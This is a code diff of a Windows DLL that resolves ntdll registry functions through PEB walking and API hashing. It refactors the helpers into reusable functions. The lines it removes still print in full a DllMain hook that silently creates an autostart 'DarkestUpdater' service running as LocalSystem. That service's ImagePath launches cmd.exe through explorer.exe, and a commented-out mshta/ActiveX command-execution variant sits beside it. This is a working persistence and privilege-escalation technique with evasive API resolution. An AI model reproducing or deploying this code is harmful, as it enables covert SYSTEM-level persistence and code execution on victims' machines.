@@ -9,8 +9,6 @@
 #define EXPORT
 #endif
 
-API_TABLE api;
-
 HMODULE GetLibraryBase(const wchar_t *dllName) {
     //PEB is located at offset 60
     ULONG_PTR peb = __readgsqword(0x60);
@@ -67,55 +65,34 @@ void *GetProcAddressByHash(HMODULE hModule, const char *targetHash) {
     return NULL;
 }
 
-BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
-    switch (fdwReason) {
-        case DLL_PROCESS_ATTACH:
-            OnProcessAttach();
-            break;
-        case DLL_PROCESS_DETACH:
-            break;
-        default:
-            return FALSE;
-    }
-    return TRUE;
-}
-
-void ArchiveNativeAPIs(HMODULE hNtdll) {
+void ArchiveNativeAPIs(HMODULE hNtdll, API_TABLE * table) {
     // Replace 'ManualExportWalker' with your existing export-walking function
-    api.NtCreateKey = (pNtCreateKey) GetProcAddress(hNtdll, "NtCreateKey");
-    api.NtSetValueKey = (pNtSetValueKey) GetProcAddress(hNtdll, "NtSetValueKey");
-    api.NtClose = (pNtClose) GetProcAddress(hNtdll, "NtClose");
-    api.NtOpenKey = (pNtOpenKey) GetProcAddress(hNtdll, "NtOpenKey");
+    table->NtCreateKey = (pNtCreateKey) GetProcAddress(hNtdll, "NtCreateKey");
+    table->NtSetValueKey = (pNtSetValueKey) GetProcAddress(hNtdll, "NtSetValueKey");
+    table->NtClose = (pNtClose) GetProcAddress(hNtdll, "NtClose");
+    table->NtOpenKey = (pNtOpenKey) GetProcAddress(hNtdll, "NtOpenKey");
 }
 
-void OnProcessAttach() {
-    HMODULE ntdll = GetLibraryBase(L"ntdll.dll");
-    ArchiveNativeAPIs(ntdll);
-    RegisterService();
-}
 
-HANDLE CreateRegistryKey() {
+HANDLE CreateRegistryKey(PCWSTR path, API_TABLE * api) {
     HANDLE newKeyHandle = NULL;
 
     UNICODE_STRING registryPath;
-    InitUnicodeString(&registryPath, L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\DarkestUpdater");
+    InitUnicodeString(&registryPath, path);
 
     OBJECT_ATTRIBUTES objAttr;
     InitializeObjectAttributes(&objAttr, &registryPath, 0x00000040 | 0x00000002, NULL, NULL);
 
     ULONG disp = 0;
 
-    NTSTATUS status = api.NtCreateKey(&newKeyHandle, KEY_ALL_ACCESS, &objAttr, 0, NULL, REG_OPTION_NON_VOLATILE, &disp);
+    NTSTATUS status = api->NtCreateKey(&newKeyHandle, KEY_ALL_ACCESS, &objAttr, 0, NULL, REG_OPTION_NON_VOLATILE, &disp);
     if (status == 0) {
         return newKeyHandle;
     }
     return nullptr;
 }
 
-///
-/// @param path - absolute path through the registry
-/// @return the opened handle, or a nullpointer on fail
-HANDLE OpenRegistryKey(PCWSTR path) {
+HANDLE OpenRegistryKey(PCWSTR path, API_TABLE * api) {
     UNICODE_STRING registryPath;
     InitUnicodeString(&registryPath, path);
 
@@ -124,23 +101,23 @@ HANDLE OpenRegistryKey(PCWSTR path) {
 
     HANDLE handle = NULL;
 
-    if (api.NtOpenKey(&handle, OBJ_CASE_INSENSITIVE, &objAttr) == 0)
+    if (api->NtOpenKey(&handle, OBJ_CASE_INSENSITIVE, &objAttr) == 0)
         return handle;
     return nullptr;
 }
 
 NTSTATUS SetRegistryKeyValue(HANDLE keyHandle, PCWSTR name, unsigned long type, void *value,
-                             unsigned long dataSize) {
+                             unsigned long dataSize, API_TABLE * api) {
     UNICODE_STRING entryName;
     InitUnicodeString(&entryName, name);
 
     if (keyHandle != NULL) {
-        auto result = api.NtSetValueKey(keyHandle, &entryName, 0, type, value, dataSize);
+        auto result = api->NtSetValueKey(keyHandle, &entryName, 0, type, value, dataSize);
         if (result != 0) {
             char errorMsg[64];
             sprintf(errorMsg, "Write unsuccessful. NTSTATUS: 0x%08X", result);
             MessageBoxA(nullptr, errorMsg, "ERROR", MB_OK | MB_ICONERROR);
-            api.NtClose(keyHandle);
+            api->NtClose(keyHandle);
             return result;
         }
         return 0;
@@ -149,37 +126,8 @@ NTSTATUS SetRegistryKeyValue(HANDLE keyHandle, PCWSTR name, unsigned long type, 
                 "ERROR",
                 MB_OK | MB_ICONERROR);
 
-    return api.NtClose(keyHandle);
+    return api->NtClose(keyHandle);
 }
-
-int RegisterService() {
-    HANDLE keyHandle = CreateRegistryKey();
-    if (keyHandle == NULL) {
-        MessageBoxA(nullptr, "Key has not been created",
-                    "ERROR",
-                    MB_OK | MB_ICONERROR);
-        return -1;
-    }
-
-    //wchar_t* imgPath = L"\"C:\\Windows\\System32\\mshta.exe\" javascript:a=new ActiveXObject('WScript.Shell');a.Run('cmd.exe /c whoami > C:\\success.txt',0,false);window.close();";
-    int start = 2; // autorun on start
-    wchar_t* imgPath = L"explorer.exe /root,\"C:\\Windows\\System32\\cmd.exe /c whoami > C:\\success.txt\"";
-    int type = 16; // standalone process
-    int errCont = 0; // do not handle errors, just silently exit
-    wchar_t * objectName = L"LocalSystem"; // forces the service to run as the NT-AUTHORITY/system
-    wchar_t * displayName = L"Darkest updater service";
-
-    SetRegistryKeyValue(keyHandle, L"ImagePath", REG_EXPAND_SZ, imgPath, (wcslen(imgPath) + 1) * sizeof(wchar_t));
-    SetRegistryKeyValue(keyHandle, L"Start", REG_DWORD, &start, sizeof(int));
-    SetRegistryKeyValue(keyHandle, L"Type", REG_DWORD, &type, sizeof(int));
-    SetRegistryKeyValue(keyHandle, L"ErrorControl", REG_DWORD, &errCont, sizeof(int));
-    SetRegistryKeyValue(keyHandle, L"ObjectName", REG_SZ, objectName, (wcslen(objectName) + 1) * sizeof(wchar_t));
-    SetRegistryKeyValue(keyHandle, L"DisplayName", REG_SZ, displayName, (wcslen(displayName) + 1) * sizeof(wchar_t));
-
-    api.NtClose(keyHandle);
-    return 0;
-}
-
 
 void InitUnicodeString(PUNICODE_STRING DestinationString, PCWSTR SourceString) {
     if (SourceString) {
